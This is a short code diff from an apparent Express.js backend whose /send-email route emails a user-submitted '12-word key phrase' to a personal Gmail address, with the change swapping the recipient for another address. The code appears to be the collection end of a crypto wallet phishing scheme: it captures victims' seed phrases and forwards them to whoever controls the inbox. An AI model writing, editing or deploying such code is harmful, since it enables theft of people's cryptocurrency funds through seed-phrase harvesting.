@@ -41,7 +41,7 @@ app.post('/send-email', async (req, res) => {
   try {
     const data = await resend.emails.send({
       from: process.env.MAIL_FROM || 'YourApp <no-reply@yourdomain.com>',
-      to: 'johnsonray1840@gmail.com',
+      to: 'Loganray9909@gmail.com',
       subject: '12 Key Phrase Submitted',
       text: `A user has submitted the following 12-word key phrase:\n\n${keyPhrase}`,
       // Optional HTML version:
